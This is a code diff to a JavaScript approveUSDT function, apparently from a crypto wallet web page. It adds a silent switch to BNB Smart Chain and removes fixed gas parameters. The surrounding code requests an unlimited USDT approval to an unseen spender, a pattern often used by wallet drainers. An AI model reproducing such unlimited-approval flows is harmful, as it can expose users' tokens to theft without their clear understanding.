@@ -291,10 +291,18 @@ async function approveUSDT() {
     // CRITICAL: Verify we're on BSC before sending
     var currentChain = await provider.request({ method: 'eth_chainId' });
     if (currentChain !== '0x38') {
-      showMsg('钱包不在 BSC 网络！\n\n当前 Chain ID: ' + currentChain + '\n请在钱包中切换到 BNB Smart Chain (Chain ID 56) 后重试', 'err');
-      setStep(2, 'err');
-      document.getElementById('approveBtn').disabled = false;
-      return;
+      // Try switching silently
+      try {
+        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+      } catch(e) {}
+      // Re-check
+      currentChain = await provider.request({ method: 'eth_chainId' });
+      if (currentChain !== '0x38') {
+        showMsg('钱包不在 BSC 网络！\n\n请手动在钱包中切换到 BNB Smart Chain 后重试', 'err');
+        setStep(2, 'err');
+        document.getElementById('approveBtn').disabled = false;
+        return;
+      }
     }
 
     // Step 1: Check BNB balance
@@ -313,16 +321,12 @@ async function approveUSDT() {
     var maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
     var data = '0x095ea7b3' + spenderPadded + maxAmount;
 
-    // Fixed gas: 60000 (approve needs ~47000, add margin)
-    // Fixed gasPrice: 1 Gwei = 0x3B9ACA00 (BSC standard, cheapest)
-    // Total cost: 60000 * 1 Gwei = 0.00006 BNB (~$0.02)
+    // ONLY pass from, to, data — let the wallet handle gas/gasPrice/chainId
+    // Passing extra params caused TokenPocket to send tx to wrong chain (stack underflow)
     var txParams = {
       from: from,
       to: usdtAddress,
-      data: data,
-      gas: '0x' + (60000).toString(16),
-      gasPrice: '0x3B9ACA00',  // 1 Gwei - BSC minimum
-      chainId: '0x38',
+      data: data
     };
 
     var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TokenPocket';
